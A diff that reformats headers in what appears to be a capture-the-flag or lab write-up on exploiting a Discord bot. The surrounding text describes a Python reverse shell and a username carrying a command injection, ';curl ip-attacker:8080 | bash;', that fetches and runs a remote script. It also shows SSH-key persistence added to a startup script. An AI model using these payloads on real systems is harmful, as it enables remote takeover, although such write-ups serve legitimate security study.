@@ -93,7 +93,7 @@ The username used for this injection was:
 
 ## Execution
 
-#### 1)Reverse Shell
+### 1)Reverse Shell
 
 The file `response.txt` was created with the following content to establish a reverse shell:
 
@@ -118,16 +118,16 @@ This Python command creates a reverse shell:
 - It redirects the socket file descriptor to stdin (`0`), stdout (`1`), and stderr (`2`), effectively binding the shell’s input and output to the network connection.
 - It starts an interactive `/bin/sh` shell, allowing the attacker to execute commands remotely through the established connection.
 
-#### 2)Listeners
+### 2)Listeners
 Two listener processes were set up on the attacker machine by running the corresponding server code to serve the malicious payload and receive the reverse shell connection.
 
-#### 3)Username
+### 3)Username
 The Discord username was modified to include a shell injection payload due to the vulnerability in the bot’s input handling.  
 The username was set to:
 
 `;curl ip-attacker:8080 | bash;`
 
-#### 4) Triggering the Vulnerability
+### 4)Triggering the Vulnerability
 
 With the username set, the attacker can trigger the exploit by sending the command `!dice` to the bot.
 
@@ -177,8 +177,8 @@ The key's randomart image is:
 |ooo.             |
 +----[SHA256]-----+
 ```
-
 Then, I appended the generated public key to `user-b`'s `authorized_keys` by modifying `server_start.sh` as follows:
+
 ```
 echo "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGzTv8FEFTYsiVF7rOQFz/+Zme92ZgdrAvfe0KavA4xA'
 >> /home/user-b/.ssh/authorized_keys" >> server_start.sh
